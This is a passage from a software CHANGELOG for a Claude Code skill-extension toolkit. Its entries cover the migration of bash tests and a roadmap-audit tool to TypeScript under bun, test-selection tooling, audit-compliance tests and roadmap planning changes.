`setup` now fails fast with install instructions if `bun` is not on PATH —
mirrors gstack's pattern. The check runs before any work, so users get a
clear error instead of confusing "command not found" failures later. This
makes the project's existing bun dependency (already required for tests
and scripts) explicit at install time.

### Added

- `bun run setup` script alias in `package.json` — equivalent to `./setup`,
  for users who prefer driving install through the bun CLI.

### Docs

- `README.md` Installation section lists Bun v1.0+ as a requirement upfront
  alongside Claude Code and Git, and shows the `bun --cwd … run setup`
  invocation alongside the direct `./setup` form.
- Fixed stale roadmap reference: per-project install support points to
  `Group 5 Pre-flight 2 and Track 5A` (was `Group 1 Pre-flight 2 and
  Track 1A`, which referred to an older roadmap structure). The actual
  preamble path resolution + upgrade propagation work lives in Group 5
  per `docs/ROADMAP.md`.

## [0.18.11.0] - 2026-05-04

### Changed (Track 2B — bin/roadmap-audit cutover to TS)

`bin/roadmap-audit` is now a 7-line POSIX-sh shim that invokes
`src/audit/cli.ts` via `bun`. Track 2A (v0.18.6.0) shipped the TS port
with full byte-parity verified by `tests/audit-shadow.test.ts` but never
wired the binary up — the test ran every snapshot fixture twice (bash
oracle + TS shadow) and the snapshot suite continued paying bash cost.
The cutover makes the TS implementation the single source of truth.
`tests/audit-shadow.test.ts` is deleted (parity check is obsolete: oracle
and runner are now the same code). Manual touchfile entries for
`tests/audit-snapshots.test.ts` and `tests/audit-cli-contract.test.ts`
gain `src/audit/**` so audit code edits retrigger the snapshot suite via
diff selection. The 3,868-line bash binary is preserved in git history
at commit `e4f883b` (PR #58) for archaeology — no recovery path needed
since parity was verified at the time of port.

**Measured impact on a 2-core MacBook:**
`tests/audit-snapshots.test.ts` 111s → 7.3s (~15×). Full suite via
`bun run test:full` 113s → 32s (~3.5×). Phase 1's stated end-state
("`bin/roadmap-audit` is a compiled bun binary") is met (shim form, not
`bun build --compile` artifact — equivalent semantics, simpler deploy:
no per-platform binary, source is grep-able at `src/audit/**`). The
remaining ~32s suite is dominated by `tests/update.test.ts` (~11s,
shells out to `bin/update-{check,run}` and the bash `setup` script) —
that's the next leverage point but lives in Group 5's install pipeline
scope, not Group 2.

### Added (Track 4C — Skill prose corpus + in-session judging routing rule)

`tests/fixtures/skill-prose-corpus/` ships 4 markdown fixtures with rich
YAML-frontmatter provenance: 3 positive examples representing what good
output looks like for `/roadmap` reassessment, `/test-plan` extraction,
and `/pair-review` test-list generation, plus a `4-shallow-control`
negative example that's deliberately vague and generic. Each fixture
records its source skill commit, the repo commit at capture time, the
input prompt that produced the prose, the generation model, a UTC
timestamp, and the worktree state — so future replacements with
real-captured runs can match the structural contract.

The corpus is **reference material, not a test fixture.** There is no
automated judge running under `bun test`. The eng-review's original SDK
+ `EVALS=1` + `ANTHROPIC_API_KEY` pattern was reconsidered during /ship
and dropped: the test only runs on machines that already have `claude`
authenticated (it never runs in CI), so requiring a separate API key
plus a separate Anthropic SDK dependency was setup friction with no
ecological payoff. Instead, `CLAUDE.md ## Testing` adds a routing rule:
when `skills/*.md` is edited in a session, Claude proactively recommends
judging the changed prose against the corpus and the three-axis rubric
(clarity / completeness / actionability, 1–5 each, ≥3 expected on
positives, ≤2 expected on at least one axis for the control) in-session.
Cost is whatever the existing Claude Code session is paying anyway with
prompt caching across fixtures; cadence is opportunistic (only on real
prose changes), not scheduled.

This shape moves the workflow from "rare paid test that nobody runs" to
"automatic prompt at the moment that warrants it" while keeping the
fixtures + rubric as the calibration anchor. The two follow-ups the
eng-review deferred to `Future` (tool-use migration, judge-floor
tightening 3 → 4) are obsolete in this shape: there's no judge code to
migrate and no scheduled run to retune.

### Changed

`node_modules/` added to `.gitignore` (was previously leaking into
untracked file lists during /ship cycles).

## [0.18.10.0] - 2026-05-04

### Added (Track 4D — Audit-compliance test for gstack-extend invariants)

`tests/audit-compliance.test.ts` (23 tests) catches three classes of structural
drift before they ship:

(A) **Frontmatter sanity** — every `skills/*.md` opens with a `---` fence, has a
`name:` field that matches its filename, a non-empty `description:` (inline or
block-literal), and an `allowed-tools:` field. Catches accidental skill-file
breakage (missing frontmatter, mistyped name, dropped allowed-tools) at test
time instead of at first invocation.

(B) **`setup` ↔ `skills/*.md` symmetric** — every entry in `setup`'s `SKILLS=( …
)` array has a corresponding `skills/<name>.md`, and every `skills/*.md` is
listed in the array. Adding a skill file without registering it (or vice
versa) trips the test with the exact orphan name. The array is parsed via a
single regex per the locked plan — codex flagged a bun-require approach as
overengineered for 5 names.

(C) **Source-tag registry consistency** — imports the new `REGISTERED_SOURCES`
export from `src/audit/lib/source-tag.ts` and asserts that the grammar bullet
in `docs/source-tag-contract.md` lists the exact same set. Drift in either
direction (source added in code but not docs, or vice versa) fails the test
with both deltas spelled out.

### Changed

`src/audit/lib/source-tag.ts`: the previously private `SOURCE_TAG_REGISTRY`
constant is now exported as `REGISTERED_SOURCES` — the single source of truth
that the (C) describe consumes. Internal callers (`validateTagExpression`)
updated; the `SOURCE_TAG_REGISTRY` name disappears (only the bash sibling
keeps it).

### Fixed (docs/data)

- `docs/source-tag-contract.md`: added `discovered` to the source list in the
  grammar bullet — the source tag exists in `REGISTERED_SOURCES` (and was
  parsed by `parseSourceTag` since the bash port) but had been missing from
  the grammar prose. (codex finding 10 from the Track 4D /plan-eng-review.)
- `docs/TODOS.md`: retagged the `### [design]` entry on direct state-machine
  tests to `### [review]` so it conforms to the canonical source-tag set.

## [0.18.9.0] - 2026-05-04

### Added (Track 4A — Touchfiles diff selection)

`bun run test` now narrows the suite by `git diff` against the detected base
branch. Selection is built from a static TypeScript import graph for every
`tests/*.test.ts`, supplemented by a small `MANUAL_TOUCHFILES` map in
`tests/helpers/touchfiles.ts` for non-TS deps (shell binaries, fixture trees,
skill files, the `setup` script). Four safety fallbacks force a full run on
empty diff, missing base ref, any GLOBAL_TOUCHFILES hit (`package.json`,
`tsconfig.json`, `tests/helpers/{touchfiles,fixture-repo,run-bin}.ts`), or any
non-empty diff that selects zero tests. User-supplied argv (`bun test --watch
foo`) and `EVALS_ALL=1` bypass selection entirely; `bun run test:full` runs
everything unconditionally.

`scripts/select-tests.ts` is the wrapper. It exposes a pure
`planWrapperAction({ argv, env, cwd })` for testability — the spawn,
exit-code propagation, and SIGINT/SIGTERM forwarding are thin glue around
it. Base detection precedence: `TOUCHFILES_BASE` env override → `origin/main`
→ `origin/master` → `main` → `master`. `git diff --name-status` keeps both
sides of every rename so refactors track on either path.

`tests/touchfiles.test.ts` (44 tests) locks the selection contract: 6
`matchGlob` units, 6 `parseDiffNameStatus` units (modify/add/delete/rename/
copy with similarity scores), 5 `analyzeTestImports` units (value, type-only,
re-exports, dynamic, externals), 8 `computeTestSelection` units covering all
4 fallbacks + multi-hit + self-trigger + global precedence, 5
`detectBaseBranch` units (no-base, probe order, env override valid/invalid/
empty), 4 `getChangedFiles` units (incl. rename pair propagation), 3
structural invariants (every glob matches ≥1 file; every test reachable via
import graph or manual map; every manual key resolves), and 7 wrapper E2E
scenarios via `fixture-repo` (happy / EVALS_ALL=1 / empty-diff / no-base /
global / args-passthrough / rename).

Type-only imports are tracked alongside value imports — `Bun.Transpiler.scanImports`
erases `import type` lines (they vanish at runtime), so a regex supplement in
`analyzeTestImports` catches them. Otherwise tests that consume types from a
src module would be silently skipped when the type shape changed.

`tests/helpers/fixture-repo.ts` `makeEmptyRepo` now checks every `git` spawn
exit code via the same `runGit` helper `setupRepo` uses (codex C3) — silent
git failures used to surface as confusing audit-side errors instead of where
they originated.

### Changed

`package.json scripts.test` now invokes `bun scripts/select-tests.ts`;
`scripts.test:full` is the unconditional bypass. CLAUDE.md ##Testing and
README.md gained matching paragraphs documenting the contract and the env
overrides.

### Pre-flight 4A-audit (recorded inline)

Empirical median saved on the 3 most recent merged PRs (#60/#59/#58): 0% —
every PR in this repo bumps `package.json` (a locked GLOBAL touchfile
carrying the project version), forcing run-all on every changeset. The
3-PR sample is also atypically infrastructure-heavy (Tracks 2A + 3A are
by-design broad). Greenlit anyway at user direction; the selection
infrastructure ships with all 4 fallbacks intact, so selection is
correctness-safe even when GLOBAL_TOUCHFILES over-triggers. Revisit the
40% threshold once 5+ post-Group-3 steady-state PRs have landed.

## [0.18.8.1] - 2026-05-03

### Added (Group 4 implementer artifacts)

`docs/designs/group-4/` directory with locked plan files extracted from the
three remaining Track eng-review sessions (4A from bogota, 4C from valletta,
4D from richmond). Each file captures the full final scope, all locked
decisions, codex catches batch-applied, cross-model tensions resolved, and
failure modes — everything implementers need to ship without re-running
`/plan-eng-review`. New workspaces (any machine, any Conductor reset) can
bootstrap by reading three files: `docs/designs/group-4-replan.md`,
`docs/ROADMAP.md` Track 4X entry, and `docs/designs/group-4/track-4X-plan.md`.
Plans get deleted as each Track ships; directory disappears when Group 4
closes. README.md in the directory documents the workflow.

## [0.18.8.0] - 2026-05-03

### Changed (Group 4 re-plan)

`docs/designs/group-4-replan.md` (NEW, 295 lines) audits the four parallel
`/plan-eng-review` plans for Group 4 (Tracks 4A/4B/4C/4D) and eliminates the
defensive workarounds the parallel-review topology produced — phantom
`eval-store.ts` collisions, sibling-Track name collisions, premature
TEST_TIERS deferrals, and a "scaffolding pretending to be a gate" 4B
reduction. Diagnoses each workaround, proposes a clean re-division, and
pins the Pre-flight 4A-audit threshold (≥40% wall-clock saved on the median
of 3 recent PRs against a measured 117s baseline; <25% kills the Track).

`docs/ROADMAP.md` Group 4 reshaped per the design doc:
- **Track 4B dropped to `Future`** — the original eval persistence + reader +
  regression gate scope is preserved verbatim in the `Future` section,
  deferred until a Track that produces eval-store data exists. Shipping
  types + a permanently-skipped test was infrastructure with no consumer.
- **Pre-flight `4A-audit` added** — kill-cheap timing measurement gate for
  Track 4A. ≥40% saved → greenlight; 25–40% → judgment; <25% → kill.
- **Track 4A bumped M → L (~150 → ~630 LOC)** — codex flipped the approach
  from manual touchfiles globs to a hybrid TS import graph + small manual
  map. Adds 4 safety fallbacks (empty diff / no base / global hit /
  non-empty-but-zero-selected), argv passthrough with signal forwarding,
  `TOUCHFILES_BASE` env override for stacked branches, `--name-status` git
  diff for rename-safety, three structural invariants, inlined
  `makeEmptyRepo` hardening (codex C3). Gated on `4A-audit` greenlight.
- **Track 4C bumped ~250 → ~370 LOC** — locked: callJudge with baked-in
  validator, `maxRetries:0`, stop_reason guard, isJudgeScore strict
  predicate, sequential `test.each`, `process.env.EVALS === '1'` exact
  gate, per-test 60s timeout, 3+1 captured-prose fixtures with rich
  provenance. Self-gates on EVALS=1; no TEST_TIERS dependency on 4A.
- **Track 4C `_Depends on: Track 4A_`** — declares the additive merge
  overlap on `package.json` + `CLAUDE.md ## Testing` so the audit's
  COLLISIONS check passes. Serializes the merge order, not the work. If
  Pre-flight kills 4A, drop the dep line.
- **Track 4D unchanged in scope** — three describes (frontmatter sanity,
  `setup` ↔ `skills/*.md` symmetric, source-tag registry consistency).
  `_touches:_` extended to include `src/audit/lib/source-tag.ts` (new
  `REGISTERED_SOURCES` export) and the prose data fix in
  `docs/source-tag-contract.md` + `docs/TODOS.md` retag.

`Future` section gains seven items lifted from the four eng-reviews: the
deferred eval-persistence Track (full original 4B scope), gbrain-sync
allowlist for `~/.gstack/projects/*/evals/`, eval dir retention/pruning
policy, audit fail-taxonomy calibration (downgrade `ARCHIVE_CANDIDATES` to
warn, design narrow `SIZE` waiver), SKILLS-list dedup helper extraction,
`callJudge` migration to Anthropic tool-use forced JSON (trigger: 2nd
consumer or first regex bug), and judge-floor tightening 3 → 4 after 5–10
EVALS runs accumulate.

Group 4 totals: 4 tracks → 3 tracks (+ 1 Pre-flight gate). 13 tasks
unchanged (4 Pre-flight + 9 track tasks). The four eng-review session
plans (bogota/dalat-v1/valletta/richmond) stay valid as implementation
input — implementers consume them directly without re-review. Mechanics
for execution documented in Phase 0–4 sequence in the design doc's "Next
steps" section.

## [0.18.7.0] - 2026-04-30

### Added (Group 3, Track 3A — Migrate test runners + invariants test)

Replace 7 bash test runners (~2,800 LOC) with bun:test files (~1,400 LOC TS),
add a structural-invariants safety net, and pin the audit's CLI contract beyond
stdout. The headline win is **maintainability**, not raw speed: bash is the
wrong language for markdown-shaped state-machine tests, and the TS port lets
parsers + helpers + scorer be unit-tested directly. The full /ship speedup
(~50s → ~10s) arrives when Track 2A's compile-binary cutover replaces the
bash `bin/roadmap-audit`; Track 3A alone takes /ship to ~50s → ~30s while
`audit-shadow.test.ts` keeps both engines honest.

- **`tests/audit-invariants.test.ts` (NEW)** walks every fixture's
  `expected.txt` and asserts: every `## SECTION` has a `STATUS:` line,
  STATUS values are in the canonical set (`pass/fail/warn/info/skip/found/
  none`), MODE is last, section order matches `CANONICAL_SECTIONS`. The
  list is exported from `src/audit/sections.ts` (a side-effect-free spec
  module — codex flagged that importing constants from `cli.ts` risks
  pulling argv parsing on module load). A fixture-lock invariant ties the
  const to observed fixture output: drift in either fails the test.
- **`tests/audit-cli-contract.test.ts` (NEW)** locks the lenient
  exit-code-0 + empty-stderr contract for `bin/roadmap-audit` against
  bogus flags, missing repos, files-not-dirs, malformed ROADMAPs, and
  empty `--scan-state`. Snapshot tests cover stdout; this covers
  everything else.
- **6 migrated test files**: `tests/audit-snapshots.test.ts` (was
  `test-roadmap-audit.sh`), `tests/skill-protocols.test.ts`,
  `tests/test-plan.test.ts`, `tests/test-plan-extractor.test.ts`,
  `tests/test-plan-e2e.test.ts`, `tests/update.test.ts`. Plus
  `scripts/test-source-tag.sh` retired (`tests/source-tag.test.ts` had
  full bun parity since v0.18.4).
- **`tests/helpers/fixture-repo.ts` and `tests/helpers/run-bin.ts`**
  consolidate per-test mkdtemp + git init + spawn-env scoping. Five
  callers benefit immediately (audit-shadow, audit-snapshots,
  audit-cli-contract, update, parsers tests). `runBin()` REQUIRES an
  explicit `home` parameter — no defaulting to `process.env.HOME` —
  so concurrent test files can't pollute each other's mock $HOME.
- **`src/test-plan/parsers.ts`** lifts two awk pipelines from the bash
  e2e test into pure functions: `parseGroupTracks(roadmap)` (range
  pattern that bounded `## Group N:` ↦ `## non-G`) and
  `scanPairReviewSession(dir, branch)` (markdown state-machine across
  `groups/*.md` + `parked-bugs.md`). Each has 8+ ugly-input unit tests
  covering Unicode, completion suffixes (`✓ Complete`), sub-track IDs
  (`2A.1`), branch mismatch, missing files. Codex flagged
  awk-to-regex translation as a known silent-drift surface; testing the
  parsers in isolation closes that risk.
- **`scripts/score-extractor.ts`** extracts the `--score` developer
  harness from the bash extractor test. Documented exit codes (0=pass,
  1=below threshold, 2=parse/arg error), `--help` and `--list-fixtures`
  modes, 15-test unit suite covering parse-error + scoring-math +
  threshold-edge cases. Drops the python3 dependency (bash version
  shelled out for JSON parsing).
- **`tests/fixtures/extractor-corpus/`** vendors the two design docs
  the bash test referenced as `$HOME`-relative paths (kb-only). Each
  doc opens with a provenance comment block (original path, vendoring
  date, expected keyword set, privacy note).
- **`scripts/verify-migration-parity.sh`** is a one-shot PR gate: count
  check (informational, undercounts dynamic table-driven tests) +
  named-scenario check (BLOCKING — every required describe in the TS
  port must be present). Codex pushed back on a count-only gate as
  "theater" because table-driven tests can collapse 40 bash assertions
  into 1 weak loop. After merge the gate is dead code (bash files
  don't exist) and can be retired.
- **Refactor: `tests/audit-shadow.test.ts`** uses the new helpers,
  dropping ~50 LOC of duplicated fixture/repo plumbing.

Eng-review surfaced 13 decisions (5 architectural, 2 code-quality, 1
testing, 1 performance, 4 cross-model with Codex, 2 follow-up TODOs).
All 9 user-facing decisions chose the complete option (lake score 9/11).

Test count: 771 tests passing across 27 test files.

### Removed

- `scripts/test-roadmap-audit.sh`, `scripts/test-update.sh`,
  `scripts/test-skill-protocols.sh`, `scripts/test-test-plan.sh`,
  `scripts/test-test-plan-extractor.sh`, `scripts/test-test-plan-e2e.sh`,
  `scripts/test-source-tag.sh` — all migrated; named-scenario parity
  gate verified before deletion.

## [0.18.6.0] - 2026-04-29

### Added (Group 2, Track 2A — TypeScript port of `bin/roadmap-audit`, dark code)

The whole audit pipeline ported to TypeScript across three commits (PR 1: lib +
parsers, PR 2: cli + first 12 checks, PR 3: remaining 12 checks + scan-state).
Output is byte-equivalent with the existing bash audit on every fixture.
`bin/roadmap-audit` is unchanged — the cutover (compile via `bun build --compile`,
gated by the cold-start benchmark) is the next step in Track 2A and lands separately.

- **`src/audit/cli.ts` orchestrator.** Parses argv (`--scan-state`, `--prompt`,
  `[REPO_ROOT]`), resolves the repo root via the git gateway, builds an
  `AuditCtx` once, dispatches all 24 checks in canonical order, renders each
  section in the bash-equivalent format. PARSE_ERRORS is emitted only when the
  parsers' aggregated errors are non-empty (T1 contract). `--scan-state`
  computes the full signal set (`unprocessed_count`, `in_flight_groups`,
  `origin_total`, `staleness_fail`, `git_inferred_freshness`,
  `has_zero_open_group`) and the intent envelope (`closure`, `split`,
  `track_ref`) with the bash 5-token negation window.
- **`src/audit/checks/*.ts` — 24 pure check ports.** One file per `## SECTION`,
  each `(ctx: AuditCtx) => CheckResult`. `vocab-lint`, `structure`, `phases`,
  `phase-invariants`, `staleness`, `version`, `taxonomy`, `doc-location`,
  `archive-candidates`, `dependencies`, `group-deps`, `task-list`,
  `structural-fitness`, `in-flight-groups`, `origin-stats`, `size-caps`,
  `collisions`, `parallelism-budget`, `parallelizable-future`, `style-lint`,
  `doc-inventory`, `scattered-todos`, `unprocessed`, `todo-format`. `mode` is
  special — no STATUS line; rendered via `renderMode()`.
- **`src/audit/parsers/{roadmap,phases,todos,progress}.ts`.** Single-pass scans
  returning `ParserResult<T> = {value, errors[]}`. Roadmap parser handles
  Groups, Tracks, `_touches:_`, intra-group dep cycles, `_serialize: true_`
  expansion, `✓ Complete` suffix, and Phase block discovery in one walk.
- **`src/audit/lib/*.ts` — pure helpers.** `git.ts` is the sole subprocess
  gateway under `src/audit/**` (`tests/audit-no-stray-shellouts.test.ts`
  enforces this contract). `semver.ts` ports the 4-digit comparator,
  `effort.ts` ports the env > config > default ceiling lookup, `source-tag.ts`
  was ported in v0.18.4 and is now consumed by todo-format/origin-stats.
  New in PR 3: `todo-patterns.ts` (count_todo_patterns awk replacement),
  `parallelism-cap.ts` (CLAUDE.md `<!-- roadmap:parallelism_cap=N -->` parsing),
  `shared-infra.ts` (docs/shared-infra.txt loader with hand-rolled brace
  expansion — no eval, expand-cap defense), `md-walk.ts` (maxdepth-2 .md
  file walker matching bash exclusions), `in-flight.ts` (Group frontier
  computation shared by IN_FLIGHT_GROUPS / PARALLELISM_BUDGET /
  PARALLELIZABLE_FUTURE).
- **`tests/audit-shadow.test.ts` — D8 cutover safety net.** Runs both bash
  audit and `bun run src/audit/cli.ts` on every fixture, diffs each section
  byte-for-byte, plus `--scan-state` JSON parity. 23 fixtures pass.
- **Per-check unit tests** for the high-judgment cases that snapshot fixtures
  don't isolate cleanly: `check-group-deps.test.ts` (DAG validation, cycles,
  STALE_DEPS), `check-staleness.test.ts` (mocked GitGateway for tag/log
  injection), `lib-todo-patterns.test.ts` (fence handling, no double-counting),
  `lib-parallelism-cap.test.ts` (override + invalid-value fallback),
  `lib-in-flight.test.ts` (default-prev rule, unknown deps, numeric ordering).
- **D3 contract test** — `tests/audit-no-stray-shellouts.test.ts` fails if
  `Bun.spawn` / `child_process` / `execSync` appears anywhere under
  `src/audit/**` outside `lib/git.ts`. Single auditable subprocess surface.
- **TODO-2 contract test** — `tests/audit-locale-safety.test.ts` fails if
  `localeCompare` / `Intl.*` / `.sort()` without comparator appears under
  `src/audit/**` without an inline `// LC_ALL=C: <reason>` waiver.

Test gates: 318 bun tests across 16 files (was 257 before Group 2 work).
Bash snapshot suite still 23/23 green. `bin/roadmap-audit` byte-identical
to its pre-port output across all fixtures.

## [0.18.5.1] - 2026-04-29

### Added (`docs/TODOS.md`)
- **TODO: `/gstack-extend-upgrade` skill mirroring `/gstack-upgrade`.** Detect install type, fetch latest from gstack-extend remote, run setup, run migrations, write upgrade marker, summarize What's New from CHANGELOG. Same auto-upgrade / snooze / "never ask again" UX as `/gstack-upgrade`, including the inline-upgrade flow other gstack-extend skill preambles can call when they detect `UPGRADE_AVAILABLE`. Open question: share `gstack-config` with gstack proper or ship a parallel `gstack-extend-config`.
- **TODO: telemetry parity with gstack so retro can crawl gstack-extend usage.** Today the five gstack-extend skills emit nothing. gstack writes per-skill activations + outcomes to `~/.gstack/analytics/skill-usage.jsonl` and `/retro` reads it (see `~/.claude/skills/gstack/retro/SKILL.md` lines 60, 905, 913). Plan: write to the same dir with a matching schema (plus a `source: "gstack-extend"` field or skill-name prefix to disambiguate) so one retro pass aggregates both toolchains without a reader change. Per-skill preamble + completion block, optional `gstack-extend-telemetry` helper, optional eureka logging. Gates on the same `gstack-config get telemetry` setting once the config-sharing decision lands.

## [0.18.5] - 2026-04-29

### Added (`bin/roadmap-audit`)
- **`## PHASES` section** emits one row per declared `## Phase N: Title` block (`phase=N title="..." groups=[...] state=in_flight|complete current_group=M scaffolding_decls=N`). State derives from `✓ Complete` markers on the listed Groups: every Group Complete → `complete`; otherwise `in_flight` with the lowest-numbered open Group as `current_group`. Always emits — projects without any Phase block see `STATUS: skip` and a `(none declared)` body, so the canonical section order stays stable and the post-bun-port `audit-invariants` test can keep asserting "every section has a STATUS line."
- **`## PHASE_INVARIANTS` check** validates declared Phases without crashing on malformed input. Rules: Phase declares ≥2 Groups; each listed Group has a matching `## Group N` heading; the Group list is sequential ascending integers (no gaps); no Group number is claimed by two Phases; each scaffolding-contract path resolves with `test -f` (or glob match for paths containing `*`). Malformed Phase blocks (missing `**End-state:**` or `**Groups:**`) emit one warn per missing field rather than failing the audit. All findings are `STATUS: warn` — informative, not gating.
- **Vocab-lint PHASE state** — fourth state in the existing `check_vocab_lint` machine alongside TOPLEVEL/GROUP/FUTURE. Entered by `^## Phase \d+:`, exited by the next `## ` heading. Inside PHASE state the word "phase" is allowed; everywhere else it remains banned (the strict ban is the whole point — it stops "phase" from creeping back in as project-management noise).
- **Phase 1 declared in `docs/ROADMAP.md`** — wraps Groups 1-4 (Bun Test Migration) with end-state, sequential Groups list, and scaffolding contract. Groups 5-6 stay standalone (no shared end-state).
- **8 new audit snapshot fixtures** under `tests/roadmap-audit/`: `phase-happy/`, `phase-no-phases/`, `phase-malformed-missing-endstate/`, `phase-malformed-missing-groups/`, `phase-listed-group-missing/`, `phase-double-claimed-group/`, `phase-scaffolding-missing-file/`, `vocab-phase-banned/`. Existing 14 fixtures gained the new `## PHASES STATUS: skip` block via mass `UPDATE_SNAPSHOTS=1` regen — diff is a constant ~10 lines per fixture.

### Changed (`/roadmap` skill prose)
- **Phase added to vocabulary section.** Notes the audit's `check_phases` and `check_phase_invariants` validate declared Phases and points readers to `docs/designs/roadmap-phases.md` for grammar. Most projects don't need Phases — declare one only when 2+ sequential Groups together deliver one named end-state no single Group ships.
- **Init/restructure asks "do these Groups deliver one feature?"** When a structural proposal includes 2+ sequential Groups, one extra AskUserQuestion confirms whether a Phase wraps them. Default no Phase. Sequential Groups linked only by file collision (e.g., Groups 5→6) are not a Phase.
- **Phase-context hint at the top of every `/roadmap` run.** When the audit's PHASES row reports `state=in_flight`, prose prints one line: "Phase N (Title) in flight: current_group=M, all_groups=[...]. Mid-Phase ships default to PATCH; when the last Group lands, /ship will recommend MINOR." When `state=complete`, the line tells the user that the next `/ship` is phase-closing and to pick MINOR at Step 12.
- **Step 6 Version Recommendation gains a Phase-aware default.** Phase-closing → recommend MINOR; mid-Phase → recommend PATCH. Both defaults are overridable — phase that ends in cleanup/migration may still be PATCH; mid-Phase Group with independent user-visible value can be MINOR. The 4-digit version scheme is unchanged; this only nudges the recommendation surface.

## [0.18.4] - 2026-04-29

### Added (Group 1, Track 1A — Bun Test Toolchain)
- **`bun test` now runs alongside the existing bash suites.** `package.json` declares `engines.bun >=1.0` and `scripts.test = "bun test tests/"`. `tsconfig.json` configures strict ESM + `types: ["bun"]` for IDE/typecheck. `/ship` runs both bash and bun suites together; the full set still completes in ~65 seconds. Run `bun run test` for the bun-only entry point during local development.
- **`src/audit/lib/source-tag.ts` (NEW) — TypeScript port of `bin/lib/source-tag.sh`.** Seven pure-function string transforms: `parseSourceTag`, `normalizeTitle`, `computeDedupHash`, `routeSourceTag`, `validateTagExpression`, `extractTagFromHeading`, `extractTitleFromHeading`. Flat camelCase named exports, `Result<T, Reason>` discriminated union for parse and validate failures (preserves the bash `MALFORMED_TAG` / `UNKNOWN_SOURCE` / `INJECTION_ATTEMPT` security taxonomy). The TS port runs ~10× faster than the bash original and unblocks the Group 2 TypeScript port of `bin/roadmap-audit`. The bash version stays in place — Track 2A retires it once `bin/roadmap-audit` consumes the TS module.
- **`tests/source-tag.test.ts` (NEW) — 118 tests / 216 expects, full coverage.** Includes 11 parse, 9 normalize, 5 hash, 7 validate, and 7 extractor ports of the existing bash assertions, plus a 25-row table-driven routing matrix covering all 24 canonical (source, severity) tuples per `docs/source-tag-contract.md`, plus tightened `INJECTION_ATTEMPT` vs `MALFORMED_TAG` reason-code asserts (now requires the specific reason, not "either"), plus 30 byte-exact bash-parity hash fixtures.
- **`tests/fixtures/source-tag-hash-corpus.json` (NEW) — REGRESSION-CRITICAL byte-exact bash parity oracle.** 30 inputs (ASCII, em-dashes, smart quotes, CJK / Cyrillic / Arabic, trailing-metadata sentinels, edge boundaries, internal control chars `\t`/`\n`/`\r`/`\v`/`\f`) each paired with the bash `compute_dedup_hash` output. The TS port asserts byte-exact match. Manifest header records `bash --version`, `uname`, `LC_ALL=C`, the byte-input contract (`Buffer.from(normalized, 'utf8')` for `printf '%s'` parity), and the generator command — so any future regen on a different machine is auditable.
- **`scripts/regen-source-tag-corpus.sh` (NEW).** Forces `LC_ALL=C` before sourcing `bin/lib/source-tag.sh` so corpus regeneration on a non-C locale can't embed locale-dependent hashes. Idempotent — re-run after touching either implementation, then `git diff tests/fixtures/` shows hash drift.

### Fixed (`src/audit/lib/source-tag.ts` — bash parity)
- **`normalizeTitle` now matches bash byte-for-byte on inputs containing internal whitespace control chars.** First implementation collapsed `[\t\n\v\f\r ]+` to a single space, but bash `tr -s '[:space:]'` only squeezes runs of *identical* whitespace chars (`\t \t` stays as `\t \t`), and `sed` is line-based so leading/trailing trim runs per newline-separated segment, not over the whole string. Adversarial review caught the divergence pre-merge: `"line1\nline2"` was hashing differently in TS vs bash. Three-part fix: (1) sentinel-strip regexes use the `m` flag and exclude `\n` from the whitespace class, so per-line semantics match `sed`; (2) whitespace squeeze keys off a backref (`/([\t\n\v\f\r ])\1+/g`) instead of a flat alternation; (3) trailing newlines are stripped from the final output to mirror bash `$(...)` command-substitution semantics. Locked in by 7 new corpus fixtures with internal control chars.
- **Stale comment in `scripts/regen-source-tag-corpus.sh`.** Header claimed "pure bash + python3 fallback" but the script always shells out to `python3` for JSON escaping. Comment now says what the code actually does.

### Changed (CLAUDE.md)
- **`## Testing` section names both suites explicitly.** Spells out that `/ship` runs `./scripts/test-*.sh` AND `bun run test`. Documents `./scripts/regen-source-tag-corpus.sh` as the procedure for regenerating the byte-exact bash hash corpus when `bin/lib/source-tag.sh` semantics change.

## [0.18.3] - 2026-04-29

### Added
- **`docs/designs/roadmap-phases.md`.** Optional outer envelope for sequential Groups that together deliver one named end-state (e.g. "all bash test scripts deleted; bun is sole runner" across Groups 1–4 of `bun-test-architecture.md`). Reviewer-facing legibility fix: PR review tools were over-flagging dead-code between Group PRs because they couldn't see future Groups; declaring a Phase + scaffolding contract in ROADMAP.md makes intentional forward-references visible. Single-source affiliation (Phase block lists `Groups: ...`; no per-Group tag), audit emits a new `## PHASES` section + `PHASE_INVARIANTS` check (≥2 Groups, listed Groups exist, sequentiality, no double-claim, scaffolding `test -f`, malformed-block warns). Vocab-lint gains a fourth state (`PHASE`) so the existing "phase" ban stays strict outside structured Phase declarations. Versioning gets a *recommendation* surface only — `/roadmap` freshness scan suggests MINOR on phase exit and PATCH mid-Phase; no rule becomes mechanical, human confirms at `/ship` time. Implementation deferred to a future Track; `[design]` TODO captured for direct state-machine unit tests post-bun-port. Single-repo scope: `bin/roadmap-audit` and `skills/roadmap.md` only — `/ship`, `/review`, `/plan-eng-review` (gstack proper) untouched. Reviewed via `/plan-eng-review` with codex outside voice; review report embedded at the bottom of the design doc.

## [0.18.2] - 2026-04-29

### Changed (`/roadmap` skill prose)
- **Stable IDs scoped to completed work.** Old prose said "Track 1A is Track 1A forever. Renumbering is forbidden outside canonical resets" — too absolute, and "canonical resets" was undefined. The actual rule is narrower: only ✓ Complete work has locked IDs (CHANGELOG, PROGRESS, commit references are load-bearing). Upcoming work is renumberable when priority shifts. Without this scoping, /roadmap left stale upcoming Groups in place and appended new priorities at the bottom — visually misleading vs execution order. Surfaced dogfooding the bun-test-architecture restructure on this repo: when the user said "prioritize this ahead of everything else", the skill's response was to add Groups 3–6 and pause Groups 1–2, then needed correction to renumber. Fixed at `skills/roadmap.md:178` and `:259`.
- **Pre-flight banned in single-Track Groups.** New constraint: Pre-flight exists to serialize shared-infra *before* parallel Tracks within a Group. A single-Track Group has nothing to parallelize against — fold the work into the single Track instead. If a second Track is added later, that's the moment to consider re-extracting shared-infra into Pre-flight. Surfaced same restructure run: an initial Group 2 had `Pre-flight [1] (coverage-gap fixtures) + Track 2A (TS port)`, which is the exact anti-pattern.
- **"Paused" state removed.** Earlier session prose invented a "⏸ Paused" status for Groups whose execution was deferred behind another chain. Not a real state in the model — a Group is either active (runs when DAG deps are met), ✓ Complete (shipped), or in Future (deferred to a later phase). Sequencing comes from the adjacency list, not from status labels. ROADMAP.md and PROGRESS.md cleaned up to reflect this.

### Added (audit)
